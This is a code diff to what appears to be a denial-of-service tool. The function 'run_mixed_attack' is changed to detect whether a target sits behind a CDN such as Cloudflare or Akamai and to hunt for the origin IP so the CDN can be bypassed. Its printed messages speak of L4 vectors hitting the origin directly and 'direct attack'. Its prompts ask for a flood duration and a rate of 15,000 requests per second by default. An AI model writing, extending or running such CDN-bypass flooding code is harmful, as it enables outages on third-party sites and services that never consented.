@@ -2422,28 +2422,50 @@ async def run_mixed_attack(target: str, cfg: dict):
 
     # Auto-detect CDN and find origin IP
     print(f"\n {c('c','[*]')} Checking for CDN protection...")
-    from core.recon.target_detector import auto_detect_target
-    profile = await auto_detect_target(target, verbose=False)
-    
     origin_ip = None
-    if profile and profile.has_cdn:
-        print(f" {c('y','[!]')} CDN detected: {profile.cdn_provider or 'Unknown'}")
-        print(f" {c('c','[*]')} Searching for origin IP (bypass CDN)...")
-        
+    try:
+        from urllib.parse import urlparse
+        parsed = urlparse(target)
+        hostname = parsed.hostname or target
+        import socket as _sck
+        loop = asyncio.get_event_loop()
+        direct_ip = await loop.run_in_executor(None, _sck.gethostbyname, hostname)
+        cdn_detected = False
+        cdn_name = ""
         try:
-            from core.recon.origin.origin_finder import find_origin_ip
-            origin_result = await find_origin_ip(target, timeout=15)
-            if origin_result and origin_result.get("origin_ip"):
-                origin_ip = origin_result["origin_ip"]
-                print(f" {c('g','[+]')} Origin IP found: {origin_ip}")
-                print(f" {c('g','[+]')} L4 vectors will target origin directly")
-            else:
-                print(f" {c('r','[-]')} Origin IP not found")
-                print(f" {c('y','[!]')} L4 vectors disabled, using L7 only")
-        except Exception as e:
-            print(f" {c('r','[-]')} Origin search failed: {e}")
-    else:
-        print(f" {c('g','[+]')} No CDN detected - direct attack")
+            import http.client
+            conn = http.client.HTTPSConnection(direct_ip, timeout=5)
+            conn.request("GET", "/", headers={
+                "User-Agent": "Mozilla/5.0",
+                "Host": hostname,
+            })
+            resp = conn.getresponse()
+            resp.read()
+            h = {k.lower(): v for k, v in resp.getheaders()}
+            conn.close()
+            srv = h.get("server", "")
+            cdn_markers = {"cloudflare", "akamai", "fastly", "cloudfront", "sucuri"}
+            cdn_detected = "cf-ray" in h or any(m in srv for m in cdn_markers)
+            if cdn_detected:
+                from core.recon.origin.origin_hunter import OriginHunter
+                env = load_env()
+                hunter = OriginHunter(timeout=8)
+                report = await asyncio.wait_for(hunter.hunt(target, env=env), timeout=30)
+                if report.verified_origins:
+                    origin_ip = report.verified_origins[0]
+                elif report.candidates:
+                    origin_ip = report.candidates[0].ip
+                if origin_ip:
+                    print(f" {c('g','[+]')} CDN bypass: origin IP = {origin_ip}")
+                else:
+                    print(f" {c('r','[-]')} CDN detected but origin not found")
+        except Exception:
+            pass
+        if not cdn_detected:
+            origin_ip = direct_ip
+            print(f" {c('g','[+]')} No CDN detected — origin: {direct_ip}")
+    except Exception as e:
+        print(f" {c('y','[!]')} Detection error: {e}")
 
     duration = int(get_input(" Duration (seconds, default 600): ") or "600")
     rps = int(get_input(" Total RPS (default 15000): ") or "15000")
